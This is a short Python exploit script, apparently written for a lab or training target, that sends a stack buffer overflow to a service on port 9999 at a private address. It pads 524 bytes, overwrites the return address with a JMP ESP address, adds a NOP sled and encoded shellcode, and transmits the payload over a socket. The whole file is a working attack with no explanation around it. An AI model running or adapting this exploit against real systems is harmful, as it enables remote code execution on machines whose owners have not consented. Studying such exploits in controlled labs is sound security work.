#!/usr/bin/env python3

import socket
from struct import pack

offset = 524
before_eip = b"A" * offset
eip = pack("<I", 0x311712f3) # JMP ESP

shellcode = (b"\xbb\xd1\x16\x61\x29\xda\xc5\xd9\x74\x24\xf4\x5d\x33\xc9"
b"\xb1\x12\x83\xed\xfc\x31\x5d\x0e\x03\x8c\x18\x83\xdc\x1f"
b"\xfe\xb4\xfc\x0c\x43\x68\x69\xb0\xca\x6f\xdd\xd2\x01\xef"
b"\x8d\x43\x2a\xcf\x7c\xf3\x03\x49\x86\x9b\x53\x01\x78\x54"
b"\x3c\x50\x79\x6b\x07\xdd\x98\xdb\x11\x8e\x0b\x48\x6d\x2d"
b"\x25\x8f\x5c\xb2\x67\x27\x31\x9c\xf4\xdf\xa5\xcd\xd5\x7d"
b"\x5f\x9b\xc9\xd3\xcc\x12\xec\x63\xf9\xe9\x6f")

payload = before_eip + eip + b"\x90"*16 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.25", 9999))
s.send(payload)
s.close()
